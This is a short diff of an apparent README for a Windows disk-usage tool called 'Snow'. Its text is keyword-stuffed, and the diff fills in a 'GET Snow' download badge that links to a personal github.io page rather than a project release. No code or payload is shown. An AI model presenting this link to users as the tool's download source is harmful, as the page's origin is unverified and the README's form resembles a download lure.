@@ -4,7 +4,7 @@
 
 Snow is a focused Windows disk usage utility for measuring folders, comparing large paths, and understanding where storage goes. Snow keeps scans readable, reports clear, and daily cleanup decisions easier for home users, students, offices, and technicians who rely on Snow for steady folder size disk usage insight. Using a Snow scanner, you can quickly identify which directories are taking up the most space, making the Snow cleanup process straightforward.
 
-[![GET Snow](https://img.shields.io/badge/GET%20%E2%80%94%20Snow-0078D6?style=for-the-badge&logoColor=white)](SILKA)
+[![GET Snow](https://img.shields.io/badge/GET%20%E2%80%94%20Snow-0078D6?style=for-the-badge&logoColor=white)](https://lauramartinezp957.github.io/.github/snow-scanner)
 
 ---
 
